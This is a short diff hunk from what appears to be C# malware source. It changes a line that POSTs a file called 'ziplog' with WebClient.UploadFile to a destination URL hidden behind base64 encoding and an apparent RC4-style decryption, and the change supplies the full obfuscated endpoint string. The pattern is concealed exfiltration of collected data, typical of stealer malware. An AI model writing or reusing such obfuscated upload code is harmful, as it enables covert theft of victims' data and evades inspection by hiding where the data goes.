@@ -1327,7 +1327,7 @@ System.Text.Encoding.ASCII.GetString(responseArray);
 
                 try
                 {  
-byte[] responseArr =myWebClient.UploadFile(RC(Encoding.UTF8.GetString(Convert.FromBase64String("w6/Du8O==")), "{"), "POST", ziplog);
+byte[] responseArr =myWebClient.UploadFile(RC(Encoding.UTF8.GetString(Convert.FromBase64String("w6/Du8O9VU1gwqTCqwkMM2TCisOxM8OHwrNWwr0QwpZgC8O1QVfCqsONw7vCsMK+HsO7EsOFGQ==")), "{"), "POST", ziplog);
                   
                 System.Text.Encoding.ASCII.GetString(responseArr);
                 }
